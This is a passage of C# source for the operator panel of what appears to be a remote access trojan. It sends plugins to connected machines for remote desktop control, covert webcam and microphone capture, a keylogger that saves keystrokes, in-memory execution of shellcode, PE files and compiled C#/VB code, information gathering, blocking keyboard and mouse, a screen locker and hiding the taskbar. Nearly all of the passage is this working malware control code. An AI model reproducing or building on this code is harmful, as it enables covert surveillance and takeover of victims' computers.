                    BaseIp = this.ClientHandler.IP,
                    width = remoteDesktopPictureBox.Width,
                    height = remoteDesktopPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
            }
        }

        #region "Mouse"
        private void mouseGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseGuna2ToggleSwitch.Checked)
            { this.enabledMouse = true; this.remoteDesktopPictureBox.MouseWheel += remoteDesktopPictureBox_MouseWheel; }
            else
            { this.enabledMouse = false; this.remoteDesktopPictureBox.MouseWheel -= remoteDesktopPictureBox_MouseWheel; }
        }

        private void remoteDesktopPictureBox_MouseWheel(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                RemoteMousePacket mousePacket = new RemoteMousePacket(e.Delta == 120 ? RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_UP : RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_DOWN)
                {
                    x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width,
                    y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height,
                    BaseIp = this.ClientHandler.IP
                };
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
            }
        }

        private void remoteDesktopPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                RemoteMousePacket mousePacket = new RemoteMousePacket(RemoteMousePacket.MouseTypeAction.UNKNOWN);
                if (e.Button == MouseButtons.Left)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.LEFT_DOWN;

                if (e.Button == MouseButtons.Right)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.RIGHT_DOWN;

                if (e.Button == MouseButtons.Middle)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_DOWN;

                mousePacket.x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width;
                mousePacket.y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height;
                mousePacket.BaseIp = this.ClientHandler.IP;
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
            }
        }

        private void remoteDesktopPictureBox_MouseUp(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                RemoteMousePacket mousePacket = new RemoteMousePacket(RemoteMousePacket.MouseTypeAction.UNKNOWN);
                if (e.Button == MouseButtons.Left)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.LEFT_UP;

                if (e.Button == MouseButtons.Right)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.RIGHT_UP;

                if (e.Button == MouseButtons.Middle)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_UP;

                mousePacket.x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width;
                mousePacket.y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height;
                mousePacket.BaseIp = this.ClientHandler.IP;
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
            }
        }

        private void remoteDesktopPictureBox_MouseMove(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteMousePacket
                    (
                        RemoteMousePacket.MouseTypeAction.MOVE_MOUSE,
                        e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width,
                        e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height
                    ){ BaseIp = this.ClientHandler.IP }
                    );
            }
        }
        #endregion
        #region "Keyboard"
        private void keyboardGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardGuna2ToggleSwitch.Checked)
            { this.enableKeyboard = true; }
            else
            { this.enableKeyboard = false; }
        }

        private void ClientForm_KeyUp(object sender, KeyEventArgs e)
        {
            if (enableKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;
                keysPressed.Remove(e.KeyCode);
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteKeyboardPacket((byte)e.KeyCode, false) { BaseIp = this.ClientHandler.IP });
            }
        }

        private void ClientForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (enableKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (keysPressed.Contains(e.KeyCode))
                    return;

                keysPressed.Add(e.KeyCode);
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteKeyboardPacket((byte)e.KeyCode, true) { BaseIp = this.ClientHandler.IP });
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }
        #endregion
        private void saveRemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.remoteDesktopPictureBox.Image != null)
            {
                string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
                File.WriteAllBytes(this.ClientHandler.ClientPath + "\\" + "Screenshots\\" + Date + ".jpeg", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteDesktopPictureBox.Image));
            }
        }
        #endregion
        #region "Remote WebCam"
        private void getWebCamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, remoteCameraPacket);
        }

        private void captureWebCamGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            RemoteCameraCapturePacket remoteCameraCapturePacket;
            if (captureWebCamGuna2ToggleSwitch.Checked)
            {
                this.RemoteWebCamHandler = new RemoteWebCamHandler
                {
                    HasAlreadyConnected = false
                };

                if (camerasGuna2ComboBox.Items.Count > 0 && camerasGuna2ComboBox.SelectedItem != null)
                {
                    remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1),
                        timeMS = 1,
                        index = camerasGuna2ComboBox.SelectedIndex,
                        quality = qualityGuna2TrackBar.Value,
                        BaseIp = this.ClientHandler.IP
                    };
                    ClientHandler.StartSendData(this.ClientHandler, remoteCameraCapturePacket);
                }
            }
            else
            {
                if (ClientHandler != null && camerasGuna2ComboBox.Items.Count > 0)
                {
                    remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                    {
                        BaseIp = this.ClientHandler.IP,
                        HWID = this.ClientHandler.HWID
                    };
                    ClientHandler.StartSendData(this.RemoteWebCamHandler.ClientHandler, remoteCameraCapturePacket);
                }
            }
        }

        private void saveWebCamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.remoteWebCamPictureBox.Image != null)
            {
                string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
                File.WriteAllBytes(this.ClientHandler.ClientPath + "\\" + "Camera\\" + Date + "." + "png", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteWebCamPictureBox.Image));
            }
        }
        #endregion
        #region "Remote Audio"
        private void SetLocalAudioDevices()
        {
            for (int i = 0; i < WaveOut.DeviceCount; i++)
            {
                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
                currentMachineDevicesGuna2ComboBox.Items.Add(deviceInfo.ProductName);
            }
            currentMachineDevicesGuna2ComboBox.SelectedIndex = 0;
        }

        private void remoteMicrophoneGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            RemoteAudioCapturePacket remoteAudioCapturePacket;
            if (remoteMicrophoneGuna2ToggleSwitch.Checked)
            {
                if (audioDevicesGuna2ComboBox.Items.Count > 0)
                {
                    this.RemoteMicrophoneHandler = new RemoteMicrophoneHandler
                    {
                        HasAlreadyConnected = false
                    };

                    this.RemoteMicrophoneHandler.WaveOut.DeviceNumber = currentMachineDevicesGuna2ComboBox.SelectedIndex;
                    this.RemoteMicrophoneHandler.WaveOut.Init(this.RemoteMicrophoneHandler.BufferedWaveProvider);
                    this.RemoteMicrophoneHandler.WaveOut.Play();

                    remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_ON)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1),
                        index = audioDevicesGuna2ComboBox.SelectedIndex,
                        BaseIp = this.ClientHandler.IP
                    };
                    ClientHandler.StartSendData(this.ClientHandler, remoteAudioCapturePacket);
                }
            }
            else
            {
                if (ClientHandler != null)
                {
                    remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
                    {
                        BaseIp = this.ClientHandler.IP,
                        HWID = this.ClientHandler.HWID
                    };
                    ClientHandler.StartSendData(this.RemoteMicrophoneHandler.ClientHandler, remoteAudioCapturePacket);
                }
            }
        }

        private void getMicrophonesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, remoteAudioPacket);
        }
        #endregion
        #region "Remote Execution"
        #region "DotNet"
        private void sendDotNetGuna2Button_Click(object sender, EventArgs e)
        {
            RemoteCodeExecution remoteCodeExecution = null;

            List<string> reference = new List<string>();
            foreach (DataGridViewRow row in this.importLibDataGridView.Rows)
            {
                reference.Add(row.Cells["Column31"].Value.ToString());
            }

            switch (languageComboBox.Text)
            {
                case "C#":
                    remoteCodeExecution = new RemoteCodeExecution
                        (
                        PacketType.MEM_EXEC_CSHARP_CODE,
                        $"/target:winexe /platform:{platformGuna2ComboBox.Text} /optimize- /unsafe",
                        codeTextBox.Text,
                        reference
                        );
                    break;


                case "VB":
                    remoteCodeExecution = new RemoteCodeExecution(
                        PacketType.MEM_EXEC_VB_CODE,
                         $"/target:winexe /platform:{platformGuna2ComboBox.Text} /optimize- /unsafe",
                         codeTextBox.Text,
                         reference
                        );
                    break;

            }

            if (remoteCodeExecution != null)
                remoteCodeExecution.Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);

            ClientHandler.StartSendData(this.ClientHandler, remoteCodeExecution);
        }

        private void testDotNetGuna2Button_Click(object sender, EventArgs e)
        {
            List<string> reference = new List<string>();
            foreach (DataGridViewRow row in this.importLibDataGridView.Rows)
            {
                reference.Add(row.Cells["Column31"].Value.ToString());
            }

            switch (languageComboBox.Text)
            {
                case "C#":
                    {
                        Misc.DotNetCodeExecution.TryLocally(new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } }),
                            codeTextBox.Text, platformGuna2ComboBox.Text,
                            string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }

                case "VB":
                    {
                        Misc.DotNetCodeExecution.TryLocally(new VBCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } }),
                            codeTextBox.Text, platformGuna2ComboBox.Text,
                            string.Join(",", reference).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }
            }
        }
        private void languageComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (languageComboBox.SelectedIndex == 0)
            {
                codeTextBox.Language = Language.CSharp;
                codeTextBox.Text = codeTextBox.Text = Misc.DotNetCodeExecution.GetCode(Language.CSharp);
            }
            else
            {
                codeTextBox.Language = Language.VB;
                codeTextBox.Text = Misc.DotNetCodeExecution.GetCode(Language.VB);
            }
        }
        private void addImportLibContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string newReference = Interaction.InputBox("Add reference");
            if (!newReference.EndsWith(".dll"))
                newReference += ".dll";
            Misc.DotNetCodeExecution.RowAdder(newReference, this.importLibDataGridView);
        }

        private void removeImportLibContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow row in this.importLibDataGridView.SelectedRows)
            {
                this.importLibDataGridView.Rows.RemoveAt(row.Index);
            }
        }

        private void importLibDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = importLibDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    importLibDataGridView.ClearSelection();
                    importLibDataGridView.CurrentCell = null;
                }
            }
        }
        #endregion
        #region "Shellcode"
        private void shellcodeDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = shellcodeDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    shellcodeDataGridView.ClearSelection();
                    shellcodeDataGridView.CurrentCell = null;
                }
            }
        }
        private void shellcodeDataGridView_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
        }
        private void shellcodeDataGridView_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                int rowId = this.shellcodeDataGridView.Rows.Add();
                DataGridViewRow row = this.shellcodeDataGridView.Rows[rowId];
                row.Cells["Column32"].Value = file;
            }
        }

        private void addShellCodeContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog()) 
            {
                if (openFileDialog.ShowDialog() == DialogResult.OK) 
                {
                    foreach (string shellPath in openFileDialog.FileNames) 
                    {

                        int rowId = this.shellcodeDataGridView.Rows.Add();

                        DataGridViewRow row = this.shellcodeDataGridView.Rows[rowId];

                        row.Cells["Column32"].Value = shellPath;
                    }
                }
            }
        }

        private void removeShellCodeContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow shellcode in shellcodeDataGridView.SelectedRows)
            {
                shellcodeDataGridView.Rows.RemoveAt(shellcode.Index);
            }
        }

        private void sendShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow shellcode in shellcodeDataGridView.SelectedRows)
            {
                MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_SHELLCODE, Compressor.QuickLZ.Compress(File.ReadAllBytes(shellcode.Cells[0].Value.ToString()), 1))
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
            }
        }

        #endregion
        #region "PE"
        private void nativePEDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = nativePEDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    nativePEDataGridView.ClearSelection();
                    nativePEDataGridView.CurrentCell = null;
                }
            }
        }
        private void nativePEDataGridView_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
        }

        private void nativePEDataGridView_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                int rowId = this.nativePEDataGridView.Rows.Add();
                DataGridViewRow row = this.nativePEDataGridView.Rows[rowId];
                row.Cells["Column35"].Value = file;
            }
        }

        private void addNativePEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string nativePath in openFileDialog.FileNames)
                    {

                        int rowId = this.nativePEDataGridView.Rows.Add();

                        DataGridViewRow row = this.nativePEDataGridView.Rows[rowId];

                        row.Cells["Column35"].Value = nativePath;
                    }
                }
            }
        }

        private void removeNativePEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow nativePE in nativePEDataGridView.SelectedRows)
            {
                nativePEDataGridView.Rows.RemoveAt(nativePE.Index);
            }
        }

        private void sendNativePEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MemoryExecutionPacket memoryExecutionPacket;
            foreach (DataGridViewRow nativePE in nativePEDataGridView.SelectedRows)
            {
                if (nativePE.Cells[0].Value.ToString().EndsWith(".dll"))
                {
                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1))
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                    };
                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                }
                else
                {
                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1))
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                    };
                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                }
            }
        }
        #endregion
        #region "Managed PE"
        private void managedPEDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = managedPEDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    managedPEDataGridView.ClearSelection();
                    managedPEDataGridView.CurrentCell = null;
                }
            }
        }

        private void managedPEDataGridView_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
        }

        private void managedPEDataGridView_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                int rowId = this.managedPEDataGridView.Rows.Add();
                DataGridViewRow row = this.managedPEDataGridView.Rows[rowId];
                row.Cells["Column33"].Value = file;
                if (file.EndsWith(".dll"))
                {
                    string etp = Microsoft.VisualBasic.Interaction.InputBox("Entrypoint : (Namespace.class.function)");
                    row.Cells["Column34"].Value = etp;
                }
            }
        }

        private void sendManagedPEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MemoryExecutionPacket memoryExecutionPacket;
            foreach (DataGridViewRow managedPE in managedPEDataGridView.SelectedRows)
            {
                if (managedPE.Cells[0].Value.ToString().EndsWith(".dll"))
                {
                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1))
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1),
                        managedEntryPoint = managedPE.Cells[1].Value.ToString()
                    };
                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                }
                else
                {
                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1))
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
                    };
                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                }
            }
        }

        private void removeManagedPEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow managedPE in managedPEDataGridView.SelectedRows)
            {
                managedPEDataGridView.Rows.RemoveAt(managedPE.Index);
            }
        }

        private void addManagedPEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string managedPath in openFileDialog.FileNames)
                    {

                        int rowId = this.managedPEDataGridView.Rows.Add();

                        DataGridViewRow row = this.managedPEDataGridView.Rows[rowId];

                        row.Cells["Column33"].Value = managedPath;
                    }
                }
            }
        }

        #endregion
        #endregion
        #region "Information"
        private void retrieveInformationGuna2Button_Click(object sender, EventArgs e)
        {
            InformationPacket informationPacket = new InformationPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Information.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, informationPacket);
        }
        private void retrieveNetworkGuna2Button_Click(object sender, EventArgs e)
        {
            NetworkInformationPacket networkInformationPacket = new NetworkInformationPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Information.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, networkInformationPacket);
        }
        #endregion
        #region "Keylogger"
        private void keyloggerGuna2Button_Click(object sender, EventArgs e)
        {
            KeylogPacket keylogPacket;
            if (this.keyloggerGuna2Button.Text == "Start")
            {
                this.KeyloggerHandler = new KeyloggerHandler();
                keylogPacket = new KeylogPacket
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, keylogPacket);
                this.keyloggerGuna2Button.Text = "Stop";
            }
            else
            {
                keylogPacket = new KeylogPacket(this.ClientHandler.IP, this.ClientHandler.HWID)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
                };
                ClientHandler.StartSendData(this.KeyloggerHandler.ClientHandler, keylogPacket);
                this.keyloggerGuna2Button.Text = "Start";
                File.WriteAllText(this.ClientHandler.ClientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", keystrokeRichTextBox.Text);
            }
        }
        #endregion
        #region "Chat"
        private void chatGuna2Button_Click(object sender, EventArgs e)
        {
            RemoteChatPacket chatPacket;
            if (this.chatGuna2Button.Text == "Start")
            {
                this.ChatHandler = new ChatHandler();
                chatPacket = new RemoteChatPacket(PacketType.CHAT_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Chat.dll"), 1),
                    BaseIp = this.ClientHandler.IP
                };
                ClientHandler.StartSendData(this.ClientHandler, chatPacket);
                this.chatGuna2Button.Text = "Stop";
            }
            else
            {
                chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF)
                {
                    BaseIp = this.ClientHandler.IP
                };
                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                this.chatGuna2Button.Text = "Start";
            }
        }

        private void chatSendGuna2Button_Click(object sender, EventArgs e)
        {
            if (this.ChatHandler != null)
            {
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON)
                {
                    msg = usernameChatGuna2TextBox.Text + ": " + messageChatGuna2TextBox.Text + "\n",
                    BaseIp = this.ClientHandler.IP
                };
                this.messageRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
                this.messageRichTextBox.AppendText(chatPacket.msg);
                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                this.messageChatGuna2TextBox.Text = "";
            }
        }
        #endregion
        #region "Other"
        #region "Hardware"
        private void blockKeyboardGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket;
            if (this.blockKeyboardGuna2CheckBox.Checked)
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_OFF)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
            else
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
        }

        private void blockMouseGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket;
            if (this.blockMouseGuna2CheckBox.Checked)
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_OFF)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
            else
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
        }
        #endregion
        #region "UI"
        private void rotateScreenGuna2Button_Click(object sender, EventArgs e)
        {
            ScreenRotationPacket screenRotationPacket = new ScreenRotationPacket(degreesGuna2ComboBox.Text)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, screenRotationPacket);
        }
        private void wallpaperGuna2Button_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    string ext = new FileInfo(ofd.FileName).Extension;
                    WallPaperPacket wallPaperPacket = new WallPaperPacket(Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1), ext)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
                    };
                    ClientHandler.StartSendData(ClientHandler, wallPaperPacket);
                }
            }
        }

        private void showTaskbarGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_TASKBAR)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }

        private void showDesktopIconsGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_DESKTOP_ICONS)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }

        private void hideTaskbarGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_TASKBAR)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }

        private void hideDesktopIconsGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_DESKTOP_ICONS)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }
        private void screenlockerGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket;
            if (this.screenlockerGuna2CheckBox.Checked)
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
            else
            {
                miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_OFF)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
            }
        }
        #endregion
        #region "Audio"
        private void volumeUpGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_UP)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
